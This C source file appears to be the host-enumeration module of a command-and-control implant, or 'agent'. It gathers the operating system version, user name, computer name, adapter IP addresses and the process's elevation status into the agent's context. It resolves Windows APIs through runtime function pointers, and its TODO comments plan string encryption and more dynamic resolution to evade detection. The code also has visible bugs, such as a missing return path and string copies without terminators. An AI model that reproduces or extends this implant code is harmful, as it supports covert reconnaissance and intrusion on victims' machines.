#include "enum.h"
#include "token.h"

//TODO finish enumeration

BOOL Enumerate(pAgent agent)
{
	//TODO: this may be an issue since we're not allocating memory manually & copying it into buffer.
	if(GetOperatingSystemFunc(agent) != 0) {
		printf("[error] attempting to get operating system information\n");
		return FALSE;
	}
	if (GetUser(agent) != 0) {
		printf("[error] attempting to get user information\n");
		return FALSE;
	}
	if ( GetCompName(agent) != 0) {
		printf("[error] attempting to get computer name\n");
		return FALSE;
	}
	if( GetIPAddress(agent) != 0) {
		printf("[error] attempting to get ip address\n");
		return FALSE;
	}

	agent->Context->Elevated = IsElevated(agent);
	return TRUE;
}

//TODO replacee all strings with encoded / encrypted content.
INT GetOperatingSystemFunc(pAgent agent) {
	LPCSTR OS = NULL;
	RTL_OSVERSIONINFOEXW lpVersionInformation = { 0 };
	lpVersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
	NTSTATUS status = 0;
	status = agent->pRtlGetVersion(&lpVersionInformation);
	if (status != NTSUCCESS) {
		printf("[error] attempting to retrieve the operating system versions. [%08X]", status);
		return -1;
	}
	agent->Context->dwMajorVersion = lpVersionInformation.dwMajorVersion;
	agent->Context->dwMinorVersion = lpVersionInformation.dwMinorVersion;
	agent->Context->wProductType = lpVersionInformation.wProductType;
	agent->Context->dwBuildNumber = lpVersionInformation.dwBuildNumber;
	agent->Context->dwPlatformId = lpVersionInformation.dwPlatformId;
	agent->Context->wServicePackMajor = lpVersionInformation.wServicePackMajor;
	agent->Context->wServicePackMinor = lpVersionInformation.wServicePackMinor;
	agent->Context->wSuiteMask = lpVersionInformation.wSuiteMask;
	
	return 0;
}


INT GetUser(pAgent agent) {
	PVOID            Data = NULL;
	DWORD            dwLength = UNLEN + 1;

	if (Data = LocalAlloc(LPTR, dwLength)) {
		agent->pGetUserNameA(Data, &dwLength);
		agent->Context->UserName = Data;
		return 0;
	}
	return -1;
	
}


//TODO replace this with a function that obtians comptuer name from registry or from env variables.
INT GetCompName(pAgent agent) {
	PVOID            Data = NULL;
	SIZE_T           Length = 0;
	DWORD            dwLength = 0;

	if (!agent->pGetComputerNameExA(ComputerNameNetBIOS, NULL, &dwLength))
	{
		if ((Data = LocalAlloc(LPTR, dwLength)))
		{
			if (agent->pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
			{
				agent->Context->ComputerName = Data;
				return 0;
			}
			else {
				LocalFree(Data);
				return -1;
			}
		}
	}

	
}
//TODO FIX THIS SHIT
INT GetIPAddress(pAgent agent) {
	DWORD dwLength = 0;
	PIP_ADAPTER_INFO adapter;
	INT AdapterCount = 0;

	if (agent->pGetAdaptersInfo(NULL, &dwLength)) {
		if ((adapter = (PIP_ADAPTER_INFO)LocalAlloc(LPTR, dwLength)))
		{
			if (adapter) {

				if (agent->pGetAdaptersInfo(adapter, &dwLength) == NO_ERROR) {
					PIP_ADAPTER_INFO TmpAdapter = adapter;
					while (TmpAdapter && AdapterCount < 10) {

						if (strncmp(TmpAdapter->Description, "Bluetooth", 9) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
						if (strncmp(TmpAdapter->Description, "VMware", 6) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
						if (strncmp(TmpAdapter->Description, "ExpressVPN", 10) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
						if (strncmp(TmpAdapter->Description, "Hyper-V", 7) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
							

						PIP_ADDR_STRING pIpAddressList = &TmpAdapter->IpAddressList;
						INT IPAddressCount = 1;
						

						while (pIpAddressList && IPAddressCount < 5) {
							if (strcmp(pIpAddressList->IpAddress.String, "0.0.0.0") != 0) {
								if (IPAddressCount == 1) {
									agent->Context->IPAddress[AdapterCount][0] = LocalAlloc(LPTR, StringLengthA(TmpAdapter->Description));
									MemoryCopy(agent->Context->IPAddress[AdapterCount][0], TmpAdapter->Description, StringLengthA(TmpAdapter->Description));
								}
								agent->Context->IPAddress[AdapterCount][IPAddressCount] = LocalAlloc(LPTR, StringLengthA(pIpAddressList->IpAddress.String));
								MemoryCopy(agent->Context->IPAddress[AdapterCount][IPAddressCount], pIpAddressList->IpAddress.String, StringLengthA(pIpAddressList->IpAddress.String));

								IPAddressCount++;
							}
							pIpAddressList = pIpAddressList->Next;
						}
						AdapterCount++;
						TmpAdapter = TmpAdapter->Next;
					}
					LocalFree(adapter);
					return 0;
				}
				LocalFree(adapter);
				return -1;
			}
			return -1;
		}
		return -1;
	}
	return -1;
}

BOOL IsElevated(
	pAgent agent
) {
	HANDLE Token = { 0 };
	BOOL   Admin = FALSE;

	/* query if current process token is elevated or not */
	if ((Token = TokenCurrentHandle(agent))) {
		Admin = TokenElevated(Token, agent);
	}

	/* close token handle */
	if (Token) {
		agent->pNtClose(Token); //TODO redifine NtClose through dynamic resolution.
	}

	return Admin;
}